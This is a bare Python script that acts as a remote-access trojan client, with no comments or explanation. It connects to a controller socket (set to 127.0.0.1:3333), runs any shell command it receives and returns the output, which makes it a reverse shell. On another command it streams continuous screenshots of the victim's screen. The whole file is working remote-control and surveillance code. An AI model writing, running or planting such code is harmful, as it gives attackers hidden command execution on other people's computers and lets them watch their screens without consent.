import cv2
import numpy as np
import socket
import sys
import pickle
import struct
import pyautogui
import time
from PIL import Image

import subprocess

host = '127.0.0.1'
port = 3333

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
	a = s.recv(1024)
	a = a.decode()
	if a == '/cmd':
		cmd = s.recv(1024)
		cmd = cmd.decode()
		cmd_process = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
		cmd_process = cmd_process.stdout + cmd_process.stderr
		s.send(cmd_process)
	elif a == "/share":
		while True:
			image = pyautogui.screenshot()
			image = image.resize((1366, 768), Image.ANTIALIAS)
			image = np.array(image)
			img = Image.frombytes('RGB', (1366, 768), image)
			data = pickle.dumps(np.array(img))
			s.sendall(struct.pack("L", len(data)) + data)
